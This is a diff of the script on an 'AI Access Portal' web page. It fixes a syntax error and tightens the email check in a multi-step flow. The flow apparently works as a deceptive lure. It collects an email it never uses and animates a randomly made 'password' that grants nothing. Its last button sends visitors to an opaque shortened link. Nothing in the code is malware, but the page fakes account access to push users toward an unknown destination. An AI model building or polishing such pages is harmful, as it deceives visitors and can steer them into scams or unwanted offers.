@@ -350,93 +350,93 @@
         &copy; <span id="year"></span> AI Access Portal. All rights reserved.
     </footer>
     
-    <script>
-        // Set current year in footer
-        document.getElementById('year').textContent = new Date().getFullYear();
-        
-        // Create stars background
-        const starsContainer = document.getElementById('stars');
-        for (let i = 0; i < 100; i++) {
-            const star = document.createElement('div');
-            star.classList.add('star');
-            star.style.width = `${Math.random() * 3}px`;
-            star.style.height = star.style.width;
-            star.style.left = `${Math.random() * 100}%`;
-            star.style.top = `${Math.random() * 100}%`;
-            star.style.setProperty('--duration', `${5 + Math.random() * 10}s`);
-            star.style.setProperty('--opacity', Math.random().toFixed(2));
-            star.style.animationDelay = `${Math.random() * 5}s`;
-            starsContainer.appendChild(star);
+    <!-- REPLACEMENT SECTION ONLY: The script tag at the end -->
+
+<script>
+    // Set current year in footer
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Create stars background
+    const starsContainer = document.getElementById('stars');
+    for (let i = 0; i < 100; i++) {
+        const star = document.createElement('div');
+        star.classList.add('star');
+        star.style.width = `${Math.random() * 3}px`;
+        star.style.height = star.style.width;
+        star.style.left = `${Math.random() * 100}%`;
+        star.style.top = `${Math.random() * 100}%`;
+        star.style.setProperty('--duration', `${5 + Math.random() * 10}s`);
+        star.style.setProperty('--opacity', Math.random().toFixed(2));
+        star.style.animationDelay = `${Math.random() * 5}s`;
+        starsContainer.appendChild(star);
+    }
+
+    // Page navigation
+    const pages = document.querySelectorAll('.page');
+    const loader = document.getElementById('loader');
+    const progress = document.getElementById('progress');
+
+    document.getElementById('next1').addEventListener('click', function () {
+        if (!document.getElementById('agree').checked) {
+            alert('Please agree to the terms to continue');
+            return;
         }
-        
-        // Page navigation
-        const pages = document.querySelectorAll('.page');
-        const loader = document.getElementById('loader');
-        const progress = document.getElementById('progress');
-        
-        document.getElementById('next1').addEventListener('click', function() {
-            if (!document.getElementById('agree').checked) {
-                alert('Please agree to the terms to continue');
-                return;
-            }
-            
-            showLoader(() => {
-                document.getElementById('page1').classList.remove('active');
-                document.getElementById('page2').classList.add('active');
-            });
+
+        showLoader(() => {
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
         });
-        
-        document.getElementById('next2').addEventListener('click', function() {
-            const email = document.getElementById('email').value;
-            if (!email || !email.includes('@')) {
-                alert('Please enter a valid email address');
-                return;
-            }
-            
-            showLoader(() => {
-                document.getElementById('page2').classList.remove('active');
-                document.getElementById('page3').classList.add('active');
-                
-                // Animate password generation
-                const passwordElement = document.getElementById('password');
-                passwordElement.textContent = '';
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
-                let finalPassword = '';
-                
-                for (let i = 0; i < 12; i++) {
-                    setTimeout(() => {
-                        finalPassword += chars.charAt(Math.floor(Math.random() * chars.length));
-                        passwordElement.textContent = finalPassword + '_'.repeat(12 - finalPassword.length);
-                        
-                        if (i === 11) {
-                            passwordElement.textContent = finalPassword;
-                        }
-                    }, i * 100);
-                }
-            });
-        });
-        
-        document.getElementById('next3').addEventListener('click', function() {
-    window.location.href = 'https://smrturl.co/41e5beb';
-});
-            // In a real implementation, this would open a verification modal or redirect
-        });
-        
-        function showLoader(callback) {
-            loader.classList.add('active');
-            let width = 0;
-            const interval = setInterval(() => {
-                width += 5;
-                progress.style.width = `${width}%`;
-                
-                if (width >= 100) {
-                    clearInterval(interval);
-                    loader.classList.remove('active');
-                    progress.style.width = '0%';
-                    setTimeout(callback, 300);
-                }
-            }, 50);
+    });
+
+    document.getElementById('next2').addEventListener('click', function () {
+        const email = document.getElementById('email').value;
+        const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        if (!email || !validEmail) {
+            alert('Please enter a valid email address');
+            return;
         }
-    </script>
+
+        showLoader(() => {
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page3').classList.add('active');
+
+            const passwordElement = document.getElementById('password');
+            passwordElement.textContent = '';
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
+            let finalPassword = '';
+
+            for (let i = 0; i < 12; i++) {
+                setTimeout(() => {
+                    finalPassword += chars.charAt(Math.floor(Math.random() * chars.length));
+                    passwordElement.textContent = finalPassword + '_'.repeat(12 - finalPassword.length);
+
+                    if (i === 11) {
+                        passwordElement.textContent = finalPassword;
+                    }
+                }, i * 100);
+            }
+        });
+    });
+
+    document.getElementById('next3').addEventListener('click', function () {
+        window.location.href = 'https://smrturl.co/41e5beb';
+    });
+
+    function showLoader(callback) {
+        loader.classList.add('active');
+        let width = 0;
+        const interval = setInterval(() => {
+            width += 5;
+            progress.style.width = `${width}%`;
+
+            if (width >= 100) {
+                clearInterval(interval);
+                loader.classList.remove('active');
+                progress.style.width = '0%';
+                setTimeout(callback, 300);
+            }
+        }, 50);
+    }
+</script>
 </body>
 </html>
